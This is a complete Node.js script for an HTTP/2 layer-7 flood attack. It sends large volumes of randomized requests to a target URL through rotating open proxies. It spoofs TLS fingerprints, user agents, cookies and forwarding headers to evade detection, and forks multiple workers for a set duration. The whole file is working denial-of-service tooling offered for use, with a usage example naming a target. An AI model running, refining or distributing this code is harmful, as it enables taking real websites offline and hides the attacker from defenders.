/**
 * 
 * @Http2
 * 
 */

 const net = require("net");
 const http2 = require("http2");
 const tls = require("tls");
 const cluster = require("cluster");
 const url = require("url");
 const crypto = require("crypto");
 const fs = require("fs");
 
 process.setMaxListeners(0);
 require("events").EventEmitter.defaultMaxListeners = 0;

 if (process.argv.length < 5){console.log(`Usage: node tls.js URL TIME REQ_PER_SEC THREADS\nExample: node tls.js https://tls.mrrage.xyz 500 8 1`); process.exit();}
 
const defaultCiphers = crypto.constants.defaultCoreCipherList.split(":");
const ciphers = "GREASE:" + [
    defaultCiphers[2],
    defaultCiphers[1],
    defaultCiphers[0],
    ...defaultCiphers.slice(3)
].join(":");
const sigalgs = "ecdsa_secp256r1_sha256:rsa_pss_rsae_sha256:rsa_pkcs1_sha256:ecdsa_secp384r1_sha384:rsa_pss_rsae_sha384:rsa_pkcs1_sha384:rsa_pss_rsae_sha512:rsa_pkcs1_sha512";
const ecdhCurve = "GREASE:x25519:secp256r1:secp384r1";
const secureOptions = 
crypto.constants.SSL_OP_NO_SSLv2 |
crypto.constants.SSL_OP_NO_SSLv3 |
crypto.constants.SSL_OP_NO_TLSv1 |
crypto.constants.SSL_OP_NO_TLSv1_1 |
crypto.constants.ALPN_ENABLED |
crypto.constants.SSL_OP_ALLOW_UNSAFE_LEGACY_RENEGOTIATION |
crypto.constants.SSL_OP_CIPHER_SERVER_PREFERENCE |
crypto.constants.SSL_OP_LEGACY_SERVER_CONNECT |
crypto.constants.SSL_OP_COOKIE_EXCHANGE |
crypto.constants.SSL_OP_NO_SESSION_RESUMPTION_ON_RENEGOTIATION;
 
 const secureProtocol = "TLS_method";
 const headers = {};
 
 const secureContextOptions = {
     ciphers: ciphers,
     sigalgs: sigalgs,
     honorCipherOrder: true,
     secureOptions: secureOptions,
     secureProtocol: secureProtocol
 };
 
 const secureContext = tls.createSecureContext(secureContextOptions);
 const characters = "qwertyuiopasdfghjklzxcvbnmQWERTYUIOPASDFGHJKLZXCVBNM1234567890";
 
 var proxyFile = "proxies.txt";
 var proxies = readLines(proxyFile);
 var userAgents = readLines("UserAgents.txt");
 
 const args = {
     target: process.argv[2],
     time: process.argv[3],
     Rate: process.argv[4],
     threads: process.argv[5]
 }
 
 const parsedTarget = url.parse(args.target);

 if (cluster.isMaster) {
    for (let counter = 1; counter <= args.threads; counter++) {
        console.log("Threads " + counter +  " started.");
        cluster.fork();
    }
} else { setInterval(runFlooder, 0) }
 
 class NetSocket {
     constructor(){}
 
  HTTP(options, callback) {
     const parsedAddr = options.address.split(":");
     const addrHost = parsedAddr[0];
     const payload = "CONNECT " + options.address + " HTTP/1.1\r\nHost: " + addrHost + "\r\nConnection: Keep-Alive\r\n\r\n"; //Keep Alive
     const buffer = new Buffer.from(payload);
 
     const connection = net.connect({
         host: options.host,
         port: options.port,
         allowHalfOpen: true,
         writable: true,
         readable: true
     });
 
     connection.setTimeout(options.timeout * 10 * 1000);
 
     connection.on("connect", () => {
         connection.write(buffer);
     });
 
     connection.on("data", chunk => {
         const response = chunk.toString("utf-8");
         const isAlive = response.includes("HTTP/1.1 200");
         if (isAlive === false) {
             connection.destroy();
             return callback(undefined, "error: invalid response from proxy server");
         }
         return callback(connection, undefined);
     });
 
     connection.on("timeout", () => {
         connection.destroy();
         return callback(undefined, "error: timeout exceeded");
     });
 
     connection.on("error", error => {
         connection.destroy();
         return callback(undefined, "error: " + error);
     });
 }
 }
 
 const Socker = new NetSocket();
 
 function readLines(filePath) {
     return fs.readFileSync(filePath, "utf-8").toString().split(/\r?\n/);
 }
 
 function randomIntn(min, max) {
     return Math.floor(Math.random() * (max - min) + min);
 }
 
 function randomElement(elements) {
     return elements[randomIntn(0, elements.length)];
 }
 
 function randomCharacters(length) {
     output = ""
     for (let count = 0; count < length; count++) {
         output += randomElement(characters);
     }
     return output;
 }
 
 headers[":method"] = "GET";
 headers[":scheme"] = "https";
 headers[":authority"] = parsedTarget.host;
headers["cache-control"] = "max-age=0";
headers["referer"] = "https://" + parsedTarget.host + parsedTarget.path;
 class Http2Session {
     constructor() {}
 
     Flood(client, connection) {
         const IntervalAttack = setInterval(() => {
             for (let i = 0; i < args.Rate; i++) {
                headers[":path"] = parsedTarget.pathname + "?" + randomCharacters(4) + "=" + randomCharacters(4);
                 const request = client.request(headers);
                 request.setTimeout(1 * 1000);
                 request.on("timeout", () => {
                    request.close();
                    request.destroy();
                });
                 request.on("response", response => {
                     request.close();
                     request.destroy();
                 });
 
                 request.end();
             }
         }, 1000);
 
         const timeoutHandler = () => {
             clearInterval(IntervalAttack);
             client.destroy();
             connection.destroy();
             return
         };
 
         setTimeout(timeoutHandler, randomIntn(60, 80) * 1000);
     }
 }
 
 const Http2Session2 = new Http2Session();
 
function runFlooder() {
const proxyAddr = randomElement(proxies);
const parsedProxy = proxyAddr.split(":");
const cookie = randomCharacters(4);
headers["cookie"] = cookie + "=" + cookie + ";" + cookie + "=" + cookie;
headers["user-agent"] = randomElement(userAgents);
headers["x-forwarded-for"] = parsedProxy[0];
const proxyOptions = {
host: parsedProxy[0],
port: ~~parsedProxy[1],
address: parsedTarget.host + ":443",
timeout: 15
};
Socker.HTTP(proxyOptions, (connection, error) => {
if (error) return
connection.setKeepAlive(true, 60 * 1000);
const tlsOptions = {
port: 443,
secure: true,
ALPNProtocols: ["h2"],
ciphers: ciphers,
sigalgs: sigalgs,
requestCert: true,
socket: connection,
ecdhCurve: ecdhCurve,
honorCipherOrder: false,
host: parsedTarget.host,
rejectUnauthorized: false,
clientCertEngine: "dynamic",
secureOptions: secureOptions,
secureContext: secureContext,
servername: parsedTarget.host,
secureProtocol: secureProtocol
};
const tlsConn = tls.connect(443, parsedTarget.host, tlsOptions);
tlsConn.allowHalfOpen = true;
tlsConn.setNoDelay(true);
tlsConn.setKeepAlive(true, 60 * 1000);
tlsConn.setMaxListeners(0);
const settings = {
enablePush: false,
initialWindowSize: 1073741823
};
const client = http2.connect(parsedTarget.href, {
protocol: "https:",
settings: settings,
maxSessionMemory: 15,
maxDeflateDynamicTableSize: 4294967295,
createConnection: () => tlsConn
});
client.setMaxListeners(0);
client.settings(settings);
client.on("connect", () => {
Http2Session2.Flood(client, connection)
});
client.on("close", () => {
client.destroy();
connection.destroy();
return
});
client.on("error", error => {
client.destroy();
connection.destroy();
return
});
});
}
 
 const KillScript = () => process.exit(1);
 
 setTimeout(KillScript, args.time * 1000);
 
 process.on('uncaughtException', error => {});
 process.on('unhandledRejection', error => {});
